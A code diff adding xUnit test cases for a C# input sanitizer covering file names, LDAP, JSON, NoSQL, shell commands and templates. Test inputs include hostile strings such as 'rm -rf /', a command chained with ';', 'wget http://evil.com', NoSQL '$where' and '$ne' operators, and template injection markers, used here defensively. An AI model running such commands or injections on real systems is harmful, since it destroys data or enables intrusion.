@@ -38,6 +38,12 @@ public class InputSanitizerTests
     [InlineData("file.txt", "file.txt")]
     [InlineData("../file.txt", "__file.txt")]
     [InlineData("file?.txt", "file_.txt")]
+    [InlineData("CON.txt", "_CON.txt")]
+    [InlineData("file<>|.txt", "file___.txt")]
+    [InlineData("...file.txt", "_file.txt")]
+    [InlineData("file.txt   ", "file.txt")]
+    [InlineData("file/path.txt", "file_path.txt")]
+    [InlineData("file\\path.txt", "file_path.txt")]
     [InlineData("", "")]
     [InlineData(null, null)]
     public void SanitizeFileName_ShouldRemoveDangerousCharacters(string? input, string? expected)
@@ -140,6 +146,93 @@ public class InputSanitizerTests
     {
         // Act
         var result = InputSanitizer.SanitizeForLogging(input);
+
+        // Assert
+        Assert.Equal(expected, result);
+    }
+
+    [Theory]
+    [InlineData("(cn=user)", "\\28cn=user\\29")]
+    [InlineData("uid=admin*", "uid=admin\\2a")]
+    [InlineData("normal_user", "normal_user")]
+    [InlineData("user\\name", "user\\5cname")]
+    [InlineData("special(*)chars", "special\\28\\2a\\29chars")]
+    [InlineData("", "")]
+    [InlineData(null, null)]
+    public void SanitizeLdap_ShouldEscapeLdapSpecialCharacters(string? input, string? expected)
+    {
+        // Act
+        var result = InputSanitizer.SanitizeLdap(input);
+
+        // Assert
+        Assert.Equal(expected, result);
+    }
+
+    [Theory]
+    [InlineData("{\"key\": \"value\"}", "{\\\"key\\\": \\\"value\\\"}")]
+    [InlineData("Normal string", "Normal string")]
+    [InlineData("String with \"quotes\"", "String with \\\"quotes\\\"")]
+    [InlineData("String with \\ backslash", "String with \\\\ backslash")]
+    [InlineData("String with\ncontrol chars", "String with\\ncontrol chars")]
+    [InlineData("", "")]
+    [InlineData(null, null)]
+    public void SanitizeJson_ShouldEscapeJsonSpecialCharacters(string? input, string? expected)
+    {
+        // Act
+        var result = InputSanitizer.SanitizeJson(input);
+
+        // Assert
+        Assert.Equal(expected, result);
+    }
+
+    [Theory]
+    [InlineData("user_name", "user_name")]
+    [InlineData("$where: function() { return true; }", ": ) { return true; }")]
+    [InlineData("{ $ne: null }", "{ : null }")]
+    [InlineData("eval(malicious_code)", "malicious_code)")]
+    [InlineData("$regex", "")]
+    [InlineData("", "")]
+    [InlineData(null, null)]
+    public void SanitizeNoSql_ShouldRemoveNoSqlInjectionPatterns(string? input, string? expected)
+    {
+        // Act
+        var result = InputSanitizer.SanitizeNoSql(input);
+
+        // Assert
+        Assert.Equal(expected, result);
+    }
+
+    [Theory]
+    [InlineData("normal_command", "normal_command")]
+    [InlineData("rm -rf /", "-rf /")]
+    [InlineData("echo hello; rm file", "echo hello file")]
+    [InlineData("ls | grep test", "ls  grep test")]
+    [InlineData("wget http://evil.com", "wget http://evil.com")]
+    [InlineData("curl -X POST", "curl -X POST")]
+    [InlineData("", "")]
+    [InlineData(null, null)]
+    public void SanitizeCommand_ShouldRemoveCommandInjectionCharacters(string? input, string? expected)
+    {
+        // Act
+        var result = InputSanitizer.SanitizeCommand(input);
+
+        // Assert
+        Assert.Equal(expected, result);
+    }
+
+    [Theory]
+    [InlineData("Hello World", "Hello World")]
+    [InlineData("{{user.name}}", "")]
+    [InlineData("<%= evil_code %>", "")]
+    [InlineData("${dangerous}", "")]
+    [InlineData("#{ruby_code}", "")]
+    [InlineData("Normal text with {{var}}", "Normal text with ")]
+    [InlineData("", "")]
+    [InlineData(null, null)]
+    public void SanitizeTemplate_ShouldRemoveTemplateInjectionPatterns(string? input, string? expected)
+    {
+        // Act
+        var result = InputSanitizer.SanitizeTemplate(input);
 
         // Assert
         Assert.Equal(expected, result);
